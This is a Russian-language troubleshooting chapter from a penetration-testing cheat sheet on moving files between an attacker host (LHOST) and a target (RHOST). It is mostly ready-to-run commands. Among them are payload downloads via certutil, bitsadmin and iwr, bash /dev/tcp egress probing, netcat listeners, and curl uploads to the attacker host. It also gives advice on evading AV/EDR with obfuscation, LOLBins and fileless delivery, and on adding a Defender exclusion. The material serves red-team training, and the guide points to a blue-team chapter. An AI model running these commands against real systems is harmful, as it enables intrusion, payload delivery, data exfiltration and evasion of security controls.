# 14 - Troubleshooting

> [← README](../../README_RU.md) · [Следующий раздел →](15-for-blue-team.md)

Что делать, когда передача не идёт, файл битый или AV режет. Ниже - типовые проблемы, диагностика и разбор по транспортам.

> **Вынесено в другие файлы:** кодирование - [10](10-encoding.md), шифрование - [11](11-encryption.md), DNS/ICMP - [12](12-dns-icmp.md), стеганография - [13](13-stegano.md).

---

## Навигация

|  |  |
|---|---|
| [Типовые проблемы](#типовые-проблемы) | [1. Доходит ли трафик (диагностика связности)](#1-доходит-ли-трафик-диагностика-связности) |
| [2. Диагностика egress / фаервола](#2-диагностика-egress--фаервола) | [3. Проверка целостности файла](#3-проверка-целостности-файла) |
| [4. Файл бьётся (бинарный режим)](#4-файл-бьётся-бинарный-режим) | [5. Обрыв / неполный файл](#5-обрыв--неполный-файл) |
| [6. AV/EDR режет](#6-avedr-режет) | [7. Нет `wget`/`curl` или урезан PowerShell](#7-нет-wgetcurl-или-урезан-powershell) |
| [8. Медленная передача](#8-медленная-передача) | [9. Разбор по транспортам](#9-разбор-по-транспортам) |

---

## Типовые проблемы

| Проблема | Причина | Решение |
|----------|---------|---------|
| Файрвол блокирует | egress режет порт | порт **80/443** (или 53/udp) - см. [01](01-attacker-to-target.md) |
| AV режет файл | сигнатура/эвристика | обфускация/шифрование ([11](11-encryption.md)), LOLBins ([09](09-lolbins.md)) |
| Нет `wget`/`curl` | урезанная система | `bash /dev/tcp` ([07](07-netcat.md)), python/perl/php ([01](01-attacker-to-target.md)) |
| PowerShell урезан | политики/AMSI | `certutil`, `bitsadmin`, `mshta` ([01](01-attacker-to-target.md), [09](09-lolbins.md)) |
| BITS `0x80200013` | сервер игнорирует `Range` (`python3 -m http.server`, `php -S`) | проверьте `curl -H 'Range: bytes=0-9'`; добавьте `/dynamic`/`-Dynamic` или используйте `busybox`/`ruby`/`nginx`/`updog` - [01](01-attacker-to-target.md#bitsadmin-cmd) |
| Файл битый | текстовый режим, обрыв | бинарный режим, хэш-сверка (§3), сжатие+base64 ([10](10-encoding.md)) |
| Медленная передача | канал/протокол | сжать ([10](10-encoding.md)), сменить транспорт |
| Ничего не качается | нет связности | диагностика (§1-§2) |
| `net use`/SMB не идёт | guest/signing/445 | см. [03](03-smb.md) |
| WebDAV не монтируется | служба WebClient/лимит | см. [04](04-webdav.md) |
| FTP висит | active-режим/NAT | пассивный режим, `--range` ([05](05-ftp.md)) |
| `nc` «зависает» на приёме | нет `-q 0`/`-N` | см. [07](07-netcat.md) |
| WinRM отказывает | workgroup/TrustedHosts | см. [08](08-rdp-winrm.md) |

---

## 1. Доходит ли трафик (диагностика связности)

### RHOST → LHOST (цель видит нас?)

**Linux:**
```bash
curl -I http://$LHOST || wget --spider http://$LHOST
```

**Linux - проверка конкретного порта:**
```bash
nc -zv $LHOST 80
```

**Windows - PowerShell:**
```powershell
Test-NetConnection $LHOST -Port 80
```

**Windows - CMD:**
```cmd
powershell -c "Test-NetConnection %LHOST% -Port 80"
```

### LHOST слушает?

**Linux:**
```bash
ss -tlnp | grep -E ':(80|443|8000)'
```

**Windows:**
```cmd
netstat -ano | findstr LISTENING
```

> Если `curl -I` на RHOST молчит, а LHOST слушает - дело в **egress-фаерволе** между ними (см. §2), а не в сервере.

---

## 2. Диагностика egress / фаервола

**Проверить, куда вообще можно ходить (Linux):**
```bash
for p in 80 443 53 8080 4444; do timeout 2 bash -c "echo > /dev/tcp/$LHOST/$p" 2>/dev/null && echo "$p open" || echo "$p closed"; done
```

**Проверить DNS (резолвится ли имя):**
```bash
nslookup example.com
```

**Проверить HTTP через прокси (Linux):**
```bash
curl -x http://proxy:8080 -I http://$LHOST
```

**Проверить HTTP через системный прокси (Windows):**
```powershell
$wc = New-Object Net.WebClient; $wc.Proxy = [Net.WebRequest]::GetSystemWebProxy(); $wc.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
$wc.DownloadString("http://${LHOST}/")
# literal IP:
# $wc.DownloadString("http://192.168.2.5/")
```

> Частые причины: egress только на 80/443, DNS наружу закрыт, обязательный корпоративный прокси, TLS-инспекция. Тогда - DNS/ICMP ([12](12-dns-icmp.md)).

---

## 3. Проверка целостности файла

Считаем хэш **до** и **после** передачи - иначе битый байт не заметим.

**Linux (LHOST и RHOST):**
```bash
sha256sum payload.exe
```

```bash
md5sum payload.exe
```

**Windows - PowerShell:**
```powershell
Get-FileHash payload.exe -Algorithm SHA256
```

**Windows - CMD:**
```cmd
certutil -hashfile payload.exe SHA256
```

> Хэши не совпали → почти всегда **текстовый режим** (FTP ASCII, `curl` без `--data-binary`, PowerShell `Get-Content` без `-Raw`/`-Encoding Byte`) или обрыв канала. Смотрим §4.

---

## 4. Файл бьётся (бинарный режим)

**FTP - обязательно binary (Linux):**
```bash
ftp> binary
```

**FTP - binary на Windows (`ftp -s:` скрипт):**
```text
binary
```

**curl - сырое тело без преобразований:**
```bash
curl --data-binary @file.bin http://$LHOST/upload
```

**curl - загрузка файла (PUT):**
```bash
curl -T file.bin http://$LHOST/
```

**PowerShell - читать байты, а не текст:**
```powershell
[IO.File]::ReadAllBytes("C:\Users\Public\file.bin")
```

**PowerShell - писать байты:**
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\file.bin", $bytes)
```

> `Get-Content`/`Set-Content` по умолчанию работают с текстом и могут добавить `\r\n`/BOM. Для бинарей - `[IO.File]::ReadAllBytes`/`WriteAllBytes` или `-Encoding Byte` (Windows PowerShell 5.1).

**certutil - учитываем PEM-заголовки:**
```cmd
certutil -decode file.b64 payload.exe
```
`certutil -encode` добавляет `-----BEGIN CERTIFICATE-----` и переносы по 64 символа - GNU `base64 -d` их не поймёт. Кодировал certutil'ом - декодируй certutil'ом.

---

## 5. Обрыв / неполный файл

**netcat - закрыть соединение по EOF:**
```bash
nc -lvnp 4444 -q 0 > file.bin     # GNU/traditional
```

```bash
nc -lvnp 4444 -N > file.bin       # OpenBSD
```

**tar по сети - без `-q 0`/`-N` архив не закрывается:**
```bash
nc -lvnp 4444 -q 0 | tar xzf -
```

**Докачать файл (Linux):**
```bash
wget -c http://$LHOST/large.tar
```

> Проверяем размер на обоих концах (`ls -l` / `stat`), затем хэш (§3). Для больших файлов - `split` + сборка, либо `rsync` ([06](06-scp-sftp-rsync.md)).

---

## 6. AV/EDR режет

- **Обфускация/шифрование** - [11](11-encryption.md).
- **LOLBins вместо своих бинарей** - [09](09-lolbins.md) (`certutil`, `bitsadmin`, `mshta`, `regsvr32`).
- **In-memory / fileless** - [01](01-attacker-to-target.md), [11](11-encryption.md).
- **Контейнеры** (ISO+LNK, OneNote, архив с паролем) - это доставка payload, а не файловый транспорт; см. [01](01-attacker-to-target.md) и [09](09-lolbins.md).
- **Исключение Defender** (в лабе, права админа):
```powershell
Add-MpPreference -ExclusionPath "$PWD"
```
- **Тестируем на актуальном AV в изолированной лабе** - [15 - For Blue Team](15-for-blue-team.md).

---

## 7. Нет `wget`/`curl` или урезан PowerShell

**Linux - `/dev/tcp` (только bash):**
```bash
cat < /dev/tcp/$LHOST/80 > file
```

**Linux - python:**
```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://$LHOST/file','file')"
```

**Windows - certutil:**
```cmd
certutil -urlcache -f http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

**Windows - bitsadmin:**
```cmd
bitsadmin /transfer job /download /priority high http://%LHOST%/payload.exe C:\Users\Public\payload.exe
```

**Windows - PowerShell `iwr`:**
```powershell
iwr http://$LHOST/payload.exe -OutFile C:\Users\Public\payload.exe
```

> Полные списки - [01 - Attacker → Target](01-attacker-to-target.md) и [09 - LOLBins](09-lolbins.md).

---

## 8. Медленная передача

- **Сжать** перед отправкой - [10](10-encoding.md) (`gzip`/`xz`/`zstd` + base64).
- **Меньше слоёв** - каждый encode/decode добавляет время.
- **Другой транспорт** - SMB/FTP/SCP быстрее, чем DNS/ICMP ([12](12-dns-icmp.md)).
- **Параллельно** - `split` + несколько потоков, либо `aria2c -x` ([09](09-lolbins.md)).

---

## 9. Разбор по транспортам

| Транспорт | Частая проблема | Куда смотреть |
|-----------|-----------------|---------------|
| HTTP | режется порт / прокси | §2, [01](01-attacker-to-target.md) |
| SMB | guest выключен, signing, 445 | [03](03-smb.md) |
| WebDAV | служба `WebClient`, `BasicAuthLevel`, лимит 50 МБ | [04](04-webdav.md) |
| FTP | active-режим, NAT, забыт `-w` | [05](05-ftp.md) |
| SCP/SFTP | `-P` vs `-p`, host key, нужен `sshd` | [06](06-scp-sftp-rsync.md) |
| Netcat | нет `-q 0`/`-N`, BIND vs REVERSE | [07](07-netcat.md) |
| RDP/WinRM | TrustedHosts, 5985/5986 | [08](08-rdp-winrm.md) |
| DNS/ICMP | нет делегирования, `--no-cache`, egress | [12](12-dns-icmp.md) |
| Стеганография | пережатие файла, неверный пароль, малая ёмкость cover | [13](13-stegano.md) |

---

**См. также:** [01 - Attacker → Target](01-attacker-to-target.md) · [02 - Target → Attacker](02-target-to-attacker.md) · [03 - SMB](03-smb.md) · [04 - WebDAV](04-webdav.md) · [05 - FTP](05-ftp.md) · [06 - SCP/SFTP](06-scp-sftp-rsync.md) · [07 - Netcat](07-netcat.md) · [08 - RDP/WinRM](08-rdp-winrm.md) · [09 - LOLBins](09-lolbins.md) · [10 - Encoding](10-encoding.md) · [11 - Encryption](11-encryption.md) · [12 - DNS / ICMP](12-dns-icmp.md) · [13 - Steganography](13-stegano.md)

---

## Формы переменных

**Linux (bash)**
```bash
export LHOST=192.168.2.5
export RHOST=192.168.10.20
# использование: $LHOST
```

**Windows (CMD)**
```cmd
set LHOST=192.168.2.5
set RHOST=192.168.10.20
:: использование: %LHOST%
```

**Windows (PowerShell)**
```powershell
$LHOST = "192.168.2.5"
$RHOST = "192.168.10.20"
# использование: $LHOST
```

> **Про ОС в примерах:** где команда зависит от ОС - помечено **Linux:** или **Windows:**.

---

[← Назад к справочнику](../../README_RU.md)
